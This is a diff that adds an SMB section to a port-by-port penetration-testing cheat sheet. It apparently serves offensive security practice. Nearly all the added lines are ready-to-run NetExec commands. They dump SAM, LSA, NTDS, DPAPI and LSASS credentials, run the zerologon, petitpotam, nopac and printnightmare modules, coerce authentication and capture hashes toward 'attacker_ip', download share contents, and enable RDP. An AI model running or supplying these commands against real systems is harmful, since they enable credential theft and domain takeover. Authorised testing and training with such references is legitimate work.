@@ -149,6 +149,52 @@
   `enum4linux-ng -a <target>` (AD/shares enum).  
   `smbclient -L //<target>` (shares).  
   `smbmap -H <target> -p 445` (shares).
+  `nxc smb <target> -u '' -p '' --shares`  
+  `nxc smb <target> -u 'guest' -p '' --shares`
+Creds shares + access:  
+  `nxc smb <target> -u user -p pass --shares`
+RID brute (no creds sometimes):  
+  `nxc smb <target> --rid-brute (or with -u -p)`
+Domain enum (users/groups/computers/policy/sessions/loggedon):  
+  `nxc smb <dc> -u user -p pass --users`
+  `nxc smb <dc> -u user -p pass --groups`  
+  `nxc smb <dc> -u user -p pass --computers`  
+  `nxc smb <dc> -u user -p pass --pass-pol`  
+  `nxc smb <dc> -u user -p pass --sessions`  
+  `nxc smb <dc> -u user -p pass --loggedon-users`  
+  `nxc smb <dc> -u user -p pass --disks`
+Dumps:  
+  `nxc smb <target> -u user -p pass --sam`  
+  `nxc smb <target> -u user -p pass --lsa`  
+  `nxc smb <target> -u user -p pass --ntds` (drsuapi default)  
+  `nxc smb <target> -u user -p pass --ntds vss`  
+  `nxc smb <target> -u user -p pass --dpapi`
+BloodHound collection:  
+  `nxc smb <target> -u user -p pass --bloodhound -c all`
+Relay sig check + list:  
+  `nxc smb 192.168.1.0/24 --gen-relay-list relay.txt`
+Vulns / coerce:  
+  `nxc smb <target> -M zerologon`  
+  `nxc smb <target> -M petitpotam`  
+  `nxc smb <target> -M nopac`  
+  `nxc smb <target> -M printnightmare`  
+  `nxc smb <target> -M coerce_plus -o LISTENER=attacker_ip`
+Spider/download files:  
+  `nxc smb <target> -u user -p pass -M spider_plus`  
+  `nxc smb <target> -u user -p pass -M spider_plus -o READ_ONLY=False DOWNLOAD_FLAG=True`
+LSASS dumps (modules):  
+  `nxc smb <target> -u user -p pass -M lsassy`  
+  `nxc smb <target> -u user -p pass -M nanodump`  
+  `nxc smb <target> -u user -p pass -M procdump`
+Other modules:  
+  `nxc smb <target> -u user -p pass -M enum_av` (AV/EDR)  
+  `nxc smb <target> -u user -p pass -M rdp -o ENABLE=true` (enable RDP)  
+  `nxc smb <target> -u user -p pass -M slinky -o SERVER=attacker_ip NAME=file.lnk` (create symlink)  
+  `nxc smb <target> -u user -p pass -M scuffy -o SERVER=attacker_ip NAME=file.scf`  
+  `nxc smb <target> -u user -p pass -M enum_dns` (DNS via WMI)  
+  `nxc smb <target> -u user -p pass -M get_netconnections` (network conns)  
+  `nxc smb <target> -u user -p pass -M backup_operator` (NTDS dump via backup)  
+  `nxc smb <target> -u user -p pass -M ntdsutil` (NTDS via ntdsutil)`
 
 - **464/TCP - Kerberos Password Change** (user enumeration, password spraying, ticket abuse):  
   `nmap -sV --script=krb5-enum-users <target> -p464` (pre-installed).  
